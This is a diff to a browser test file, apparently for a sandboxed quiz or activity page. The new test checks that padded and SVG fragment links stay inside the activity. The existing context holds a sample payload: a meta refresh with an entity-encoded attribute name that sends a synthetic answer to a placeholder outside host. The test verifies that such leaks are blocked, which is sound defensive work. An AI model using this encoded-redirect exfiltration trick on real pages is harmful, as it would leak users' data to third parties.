@@ -138,6 +138,23 @@ describe.each([["Chromium", chromium], ["WebKit", webkit]] as const)("published 
     } finally { await state.context.close(); }
   });
 
+  it("keeps padded and SVG xlink fragment links inside the activity", async () => {
+    // Validation trims URL values and reads xlink:href as href, so it accepts both.
+    // A link without a URL inside another link leaves the outer one to follow.
+    const state = await open(source.replace(
+      "<button",
+      '<a href=" #middle\n">Jump to middle <svg width="20" height="20"><a><rect id="icon" width="20" height="20"/></a></svg></a><svg width="40" height="40"><a id="svg-link" xlink:href="#end"><rect width="40" height="40"/></a></svg><div style="height:3000px"></div><p id="middle">Middle</p><div style="height:3000px"></div><p id="end">End</p><button',
+    ));
+    try {
+      await activity(state.page).locator("#icon").click();
+      await expect.poll(() => activity(state.page).evaluate("location.hash")).toBe("#middle");
+      await activity(state.page).locator("#svg-link rect").click();
+      await expect.poll(() => activity(state.page).evaluate("location.hash")).toBe("#end");
+      expect(await activity(state.page).locator("#answer").inputValue()).toBe("SYNTHETIC_ANSWER");
+      expect(state.external).toEqual([]);
+    } finally { await state.context.close(); }
+  });
+
   it.each(["location", "encoded refresh", "top location"])("contains %s without sending the answer outside", async (payload) => {
     const html = payload === "encoded refresh"
       ? source.replace("</head>", '<meta http-equiv="&#114;efresh" content="0;url=https://outside.invalid/collect?answer=SYNTHETIC_ANSWER"></head>')
